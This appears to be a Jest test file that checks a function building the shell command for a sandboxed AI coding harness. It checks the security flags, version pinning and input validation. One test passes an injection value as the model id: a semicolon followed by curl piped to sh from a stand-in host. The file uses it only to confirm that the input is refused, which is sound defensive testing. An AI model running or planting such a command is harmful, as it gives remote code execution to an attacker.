import { PI_PACKAGE } from '@vantikhq/types';

import { piCommand } from './hosted.executor';

/**
 * The harness invocation the sandbox runs.
 *
 * This string reaches a shell, and part of it comes from whoever delegated, so
 * the tests that matter here are about what cannot get into it.
 */
describe('the bundled harness command', () => {
  it('always carries the flags that are security controls', () => {
    const command = piCommand({ provider: 'anthropic' });

    // Pi otherwise auto-discovers extensions from `.pi/extensions/*.ts` in the
    // project directory and runs them with full access — a code-execution path
    // controlled by anyone who can land a file in the repository.
    expect(command).toContain('--no-extensions');
    // Nothing is present to approve a tool call, and a harness blocked on a
    // prompt burns its lease waiting.
    expect(command).toContain('--no-approve');
    expect(command).toContain('--mode rpc');
  });

  it('pins the package rather than floating to whatever is latest', () => {
    // The run records the harness version so two runs can be compared. An
    // unpinned package makes that record a guess.
    expect(piCommand({})).toContain(PI_PACKAGE);
    expect(piCommand({})).toContain('@');
  });

  it('passes the model choice through', () => {
    expect(
      piCommand({
        provider: 'anthropic',
        model: 'claude-opus-4-5',
        thinking: 'high',
      }),
    ).toContain('--provider anthropic --model claude-opus-4-5 --thinking high');
  });

  it('drops a model id that is not safe to put in a command line', () => {
    // Refused rather than escaped: a quoting bug here is command execution in
    // the sandbox, and no legitimate model id looks like this.
    const command = piCommand({ model: 'gpt-5; curl evil.example | sh' });

    expect(command).not.toContain('curl');
    expect(command).not.toContain(';');
    expect(command).not.toContain('--model');
  });

  it('drops a thinking level Pi does not know', () => {
    // Pi rejects an unknown level and exits, so a typo in a settings field
    // would otherwise kill every run in the workspace.
    expect(piCommand({ thinking: 'very-hard' })).not.toContain('--thinking');
    expect(piCommand({ thinking: 'max' })).toContain('--thinking max');
  });

  it('leaves out what was not chosen', () => {
    const command = piCommand({});

    expect(command).not.toContain('--model');
    expect(command).not.toContain('--thinking');
    expect(command).not.toContain('--provider');
  });
});
